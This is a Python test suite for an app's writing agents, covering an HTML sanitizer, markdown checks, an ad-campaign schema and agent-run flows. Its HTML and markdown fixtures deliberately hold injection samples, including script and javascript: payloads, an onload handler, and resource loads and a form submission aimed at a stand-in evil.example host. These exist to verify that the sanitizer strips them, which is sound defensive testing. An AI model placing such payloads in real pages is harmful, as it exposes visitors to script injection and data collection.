"""Writing agents: sanitizers, checks, the ad schema, and run_agent end to end."""

import json

import pytest

from apps.accounts.models import AITokenUsage
from apps.agent.models import AgentArtifact, AgentArtifactVersion, AgentMessage
from apps.agent.runtime.parts import replay
from apps.agent.subagents.html_sanitize import MAX_BYTES, sanitize_html
from apps.agent.subagents.markdown_checks import check_markdown
from apps.agent.subagents.sheet_schema import RESPONSE_SCHEMA, SheetInvalid, validate_sheet
from apps.agent.tests.fakes import message, refusal, text, thinking, tool_use
from apps.agent.tests.runtime_support import *  # noqa: F403
from apps.agent.tests.runtime_support import make_prompt, run_events, send, tool_results_of

PAGE = """<!DOCTYPE html>
<html lang="en"><head><title>Northwind CRM</title>
<link rel="preconnect" href="https://fonts.gstatic.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap">
<link rel="stylesheet" href="https://cdn.evil.example/x.css">
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0;url=https://evil.example">
<style>
@import url("https://fonts.googleapis.com/css2?family=Lora");
@import url("https://evil.example/track.css");
.hero { background: url(https://evil.example/bg.png) no-repeat; }
.dot { background-image: url("data:image/png;base64,AAAA"); }
</style>
<script>alert(1)</script>
<script type="application/ld+json">{"@context": "https://schema.org", "@type": "FAQPage"}</script>
</head>
<body onload="steal()">
<h1>CRM for small teams</h1>
<a href="javascript:alert(1)">bad</a> <a href="https://northwind.example/pricing">ok</a>
<a href="data:text/html,hi">data link</a>
<img src="https://evil.example/pixel.gif" alt="x"><img src="data:image/png;base64,AAAA" alt="y">
<img srcset="https://evil.example/a.png 1x" alt="z">
<video poster="https://evil.example/p.png"></video>
<iframe src="https://evil.example"></iframe><object data="x.swf"></object><embed src="x">
<form action="https://evil.example/collect"><input name="email"></form>
<div style="background:url('https://evil.example/s.png')" onclick="x()">styled</div>
<svg><image href="https://evil.example/i.png"/><use href="#icon"/></svg>
</body></html>"""


def test_html_sanitizer_removes_everything_that_runs_or_loads():
    result = sanitize_html(PAGE)
    html = result.html
    assert result.error is None
    assert html.startswith("<!DOCTYPE html>")
    assert "alert(1)</script>" not in html and "javascript:" not in html
    assert '<script type="application/ld+json">' in html and "FAQPage" in html
    for gone in ("<iframe", "<object", "<embed", "<base", "http-equiv", "cdn.evil.example",
                 "evil.example/pixel.gif", "evil.example/a.png", "evil.example/p.png",
                 "evil.example/collect", "onload", "onclick", "evil.example/bg.png",
                 "evil.example/track.css", "evil.example/s.png", "evil.example/i.png",
                 "data:text/html"):
        assert gone not in html, gone
    assert "fonts.googleapis.com/css2?family=Inter" in html
    assert 'url("https://fonts.googleapis.com/css2?family=Lora")' in html
    assert "data:image/png;base64,AAAA" in html
    assert 'href="https://northwind.example/pricing"' in html
    assert 'href="#icon"' in html
    paths = {w["path"] for w in result.warnings}
    assert {"script", "iframe", "style", "link", "form", "body[onload]"} <= paths


def test_html_sanitizer_rejects_cut_off_and_oversized_pages():
    assert sanitize_html("<!DOCTYPE html><html><body><h1>Half").error
    big = "<!DOCTYPE html><html><body>" + ("x" * (MAX_BYTES + 10)) + "</body></html>"
    assert sanitize_html(big).error == "The page is larger than 400 KB."
    fenced = sanitize_html("```html\n<!DOCTYPE html><html><body>ok</body></html>\n```")
    assert fenced.error is None and fenced.html.startswith("<!DOCTYPE html>")
    assert fenced.warnings[0]["path"] == "document"


ARTICLE = "\n".join([
    "# What is the best CRM for startups?",
    "",
    "Northwind is a CRM for small teams. " * 8,
    "",
    "## How much does it cost?",
    "",
    ("It costs what the brief says. " * 40),
    "[pricing](https://northwind.example/pricing) and [bad](javascript:alert(1))",
    "<script>alert(1)</script><iframe src='https://x.example'></iframe>",
    "",
    "## Frequently asked questions",
    "",
    "### Is there a free plan?",
    "Yes, per the brief.",
])


def test_markdown_checks_strip_unsafe_html_and_links():
    result = check_markdown(ARTICLE)
    assert "<script" not in result.markdown and "<iframe" not in result.markdown
    assert "[pricing](https://northwind.example/pricing)" in result.markdown
    assert "javascript:" not in result.markdown and "bad" in result.markdown
    paths = [w["path"] for w in result.warnings]
    assert paths == ["html", "links"]


def test_markdown_checks_warn_about_structure():
    result = check_markdown("Just a short note with no heading.")
    messages = [w["message"] for w in result.warnings]
    assert "The article has no H1." in messages
    assert any("words" in m for m in messages)
    assert "The article has no FAQ section." in messages


CAMPAIGN = {
    "campaign": {"name": "CRM search", "objective": "Leads", "platform": "google_search",
                 "daily_budget": None, "bid_strategy": None,
                 "final_url": "https://northwind.example/crm"},
    "ad_groups": [{
        "name": "Best CRM",
        "keywords": [{"text": "best crm", "match": "exact"}],
        "negatives": ["free"],
        "ads": [{"headlines": ["CRM for small teams", "Try Northwind",
                               "A headline that is far too long to fit"],
                 "descriptions": ["Track every deal.", "Built for small teams."],
                 "path1": "crm", "path2": None}],
    }],
    "sitelinks": [{"text": "Pricing", "url": "https://northwind.example/pricing",
                   "description1": None, "description2": None}],
}


def test_ad_schema_reports_limits_without_truncating():
    content, warnings = validate_sheet(json.dumps(CAMPAIGN))
    headline = content["ad_groups"][0]["ads"][0]["headlines"][2]
    assert headline == "A headline that is far too long to fit"
    assert warnings == [{"path": "ad_groups[0].ads[0].headlines[2]",
                         "message": "Headline has 38 characters; the limit is 30."}]
    assert content["warnings"] == warnings


def test_ad_schema_rejects_wrong_shapes_and_has_no_length_limits():
    with pytest.raises(SheetInvalid):
        validate_sheet("{not json")
    bad = json.loads(json.dumps(CAMPAIGN))
    bad["ad_groups"][0]["keywords"][0]["match"] = "fuzzy"
    with pytest.raises(SheetInvalid):
        validate_sheet(json.dumps(bad))
    few = json.loads(json.dumps(CAMPAIGN))
    few["ad_groups"][0]["ads"][0]["headlines"] = ["One", "Two"]
    _, warnings = validate_sheet(json.dumps(few))
    assert "Google allows 3 to 15" in warnings[0]["message"]
    schema_text = json.dumps(RESPONSE_SCHEMA)
    for keyword in ("maxLength", "minLength", "maxItems", "minItems"):
        assert keyword not in schema_text


# ── run_agent through the loop ──────────────────────────────────────────

pytestmark = [pytest.mark.usefixtures("no_title")]

LANDING = ("<!DOCTYPE html><html><head><title>CRM</title></head><body><h1>CRM for small teams"
           "</h1><section><h2>FAQ</h2></section><script>track()</script>"
           '<script type="application/ld+json">{"@type": "FAQPage"}</script></body></html>')


@pytest.fixture
def allowance(settings):
    settings.AI_FREE_MONTHLY_CAP_USD = 100.0


def _agent_call(args, *, id="toolu_agent"):
    return message(text("Starting the writer."), tool_use("run_agent", args, id=id),
                   stop_reason="tool_use")


@pytest.mark.django_db
@pytest.mark.usefixtures("allowance")
def test_run_agent_writes_a_sanitized_page_version(fake_anthropic, chat, website):
    bp = make_prompt(website, "best crm for startups")
    fake_anthropic.queue(
        _agent_call({"agent": "landing_page", "title": "CRM landing page",
                     "brief": "For startup founders.", "prompt_id": str(bp.prompt_id),
                     "facts": ["Free plan for 3 users"]}),
        message(thinking("Planning the hero and the FAQ.", signature="sig-s"),
                text(LANDING, chunks=5), output_tokens=900),
        message(text("Saved the page.")),
    )

    started = send(chat, "Write a landing page")
    msg = AgentMessage.objects.get(id=started.assistant_message.id)

    artifact = AgentArtifact.objects.get()
    assert (artifact.kind, artifact.agent_key, artifact.title, artifact.latest_version) == (
        "page", "landing_page", "CRM landing page", 1)
    assert artifact.source_chat_id == chat.id and artifact.source_message_id == msg.id
    version = AgentArtifactVersion.objects.get(artifact=artifact)
    assert "track()" not in version.content and "FAQPage" in version.content
    assert version.content_type == "text/html" and version.version == 1
    assert version.warnings == [{"path": "script", "message": "Removed a script."}]
    assert version.summary.startswith("H1: CRM for small teams")
    assert version.run_id == started.run.id and version.cost_usd > 0

    events = run_events(started.run)
    kinds = [e["type"] for e in events]
    assert kinds.index("artifact.started") < kinds.index("artifact.completed")
    deltas = "".join(e["append"] for e in events if e["type"] == "artifact.delta")
    assert deltas == LANDING
    completed = next(e for e in events if e["type"] == "artifact.completed")
    assert completed["artifact_id"] == str(artifact.id) and completed["version"] == 1

    call = next(p for p in msg.parts if p["type"] == "agent_call")
    # The catalog's display name, as GET agents/ lists it.
    assert (call["status"], call["agent"], call["agent_name"], call["kind"]) == (
        "done", "landing_page", "Landing Page Agent", "page")
    assert replay(events) == msg.parts
    assert call["artifact_id"] == str(artifact.id) and call["version"] == 1

    sub = fake_anthropic.requests[1].json
    assert "tools" not in sub
    assert sub["system"][0]["cache_control"] == {"type": "ephemeral", "ttl": "1h"}
    assert "cache_control" not in sub
    assert sub["max_tokens"] == 64000
    tags = [b["text"].split(">", 1)[0] + ">" for b in sub["messages"][0]["content"]]
    assert tags == ["<brand>", "<target_prompt>", "<brief>", "<output_contract>"]
    assert "Free plan for 3 users" in sub["messages"][0]["content"][0]["text"]
    # The brand block carries the six context sections; the writer prompt
    # ends with the rules for reading them.
    brand = json.loads(sub["messages"][0]["content"][0]["text"][len("<brand>\n"):-len(
        "\n</brand>")])
    assert set(brand["context"]) == {"company", "audience", "competitors", "offerings",
                                     "strategy", "execution"}
    assert brand["offerings"] == [] and "audience" not in brand and "rules" not in brand
    from apps.agent.prompts.common import BRAND_RULES

    assert sub["system"][0]["text"].rstrip().endswith(BRAND_RULES)

    result = json.loads(tool_results_of(fake_anthropic.requests[2].json)[0]["content"])
    assert result["artifact_id"] == str(artifact.id) and result["version"] == 1
    assert result["kind"] == "page" and result["warnings"] == ["Removed a script."]
    roles = set(AITokenUsage.objects.filter(module="agent").values_list("metadata__role",
                                                                          flat=True))
    assert roles == {"orchestrator", "subagent:landing_page"}

    # A revision writes version 2 and shows the writer the current one.
    fake_anthropic.queue(
        _agent_call({"agent": "landing_page", "title": "CRM landing page",
                     "brief": "Shorter hero.", "artifact_id": str(artifact.id)}, id="toolu_2"),
        message(text(LANDING.replace("small teams", "startups"))),
        message(text("Updated.")),
    )
    send(chat, "Make the hero shorter")
    artifact.refresh_from_db()
    assert artifact.latest_version == 2
    revision = fake_anthropic.requests[4].json["messages"][0]["content"]
    assert [b["text"].split(">", 1)[0] for b in revision] == [
        "<brand", "<current_version", "<brief", "<output_contract"]


@pytest.mark.django_db
@pytest.mark.usefixtures("allowance")
def test_ad_campaign_streams_snapshots_and_keeps_limit_warnings(fake_anthropic, chat):
    fake_anthropic.queue(
        _agent_call({"agent": "ad_campaign", "title": "CRM ads", "brief": "Search ads."}),
        message(text(json.dumps(CAMPAIGN), chunks=6)),
        message(text("Done.")),
    )

    started = send(chat, "Build an ad campaign")

    sub = fake_anthropic.requests[1].json
    assert sub["output_config"]["format"] == {"type": "json_schema", "schema": RESPONSE_SCHEMA}
    snapshots = [e for e in run_events(started.run) if e["type"] == "artifact.snapshot"]
    assert snapshots and snapshots[-1]["content"]["campaign"]["name"] == "CRM search"
    version = AgentArtifactVersion.objects.get()
    assert version.content_type == "application/json"
    stored = json.loads(version.content)
    assert stored["warnings"][0]["path"] == "ad_groups[0].ads[0].headlines[2]"
    assert version.summary.startswith("CRM search: 1 ad groups, 1 ads")


@pytest.mark.django_db
def test_run_agent_refuses_to_start_without_enough_allowance(fake_anthropic, chat, settings):
    # Less than the $0.32 a writer's smallest budget (MIN_WRITER_TOKENS) costs.
    settings.AI_FREE_MONTHLY_CAP_USD = 0.25
    fake_anthropic.queue(
        _agent_call({"agent": "landing_page", "title": "Page", "brief": "x"}),
        message(text("I could not run the writer.")),
    )

    started = send(chat, "Write a page")

    assert len(fake_anthropic.requests) == 2
    result = tool_results_of(fake_anthropic.requests[1].json)[0]
    assert result["is_error"] is True and result["content"].startswith("Insufficient allowance")
    msg = AgentMessage.objects.get(id=started.assistant_message.id)
    call = next(p for p in msg.parts if p["type"] == "agent_call")
    assert call["status"] == "error"
    assert not AgentArtifact.objects.exists()


@pytest.mark.django_db
@pytest.mark.usefixtures("allowance")
def test_writer_refusal_and_cut_off_page_fail_the_artifact(fake_anthropic, chat):
    fake_anthropic.queue(
        _agent_call({"agent": "landing_page", "title": "Page", "brief": "x"}),
        refusal(text("I can")),
        message(text("The writer declined.")),
    )
    started = send(chat, "Write a page")
    failed = [e for e in run_events(started.run) if e["type"] == "artifact.failed"]
    assert failed[0]["error"]["code"] == "refused"
    assert tool_results_of(fake_anthropic.requests[2].json)[0]["is_error"] is True

    fake_anthropic.queue(
        _agent_call({"agent": "landing_page", "title": "Page", "brief": "x"}, id="toolu_cut"),
        message(text("<!DOCTYPE html><html><body><h1>Half"), stop_reason="max_tokens"),
        message(text("The page was cut off.")),
    )
    again = send(chat, "Try again")
    failed = [e for e in run_events(again.run) if e["type"] == "artifact.failed"]
    assert failed[0]["error"] == {"code": "invalid_output",
                                  "message": "The page was cut off before it was finished."}
    assert not AgentArtifact.objects.exists()
